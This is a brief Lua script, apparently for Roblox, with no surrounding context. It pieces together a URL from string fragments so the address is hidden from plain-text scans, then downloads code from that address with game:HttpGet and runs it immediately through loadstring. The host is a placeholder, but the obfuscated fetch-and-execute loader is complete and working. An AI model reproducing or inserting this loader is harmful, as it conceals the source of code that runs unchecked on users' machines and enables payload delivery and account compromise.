local function build(t)
    local o = ""
    for i = 1, #t do
        o = o .. t[i]
    end
    return o
end

local url = build({"ht","tps","://ex","ample",".com/"})
loadstring(game:HttpGet(url))()
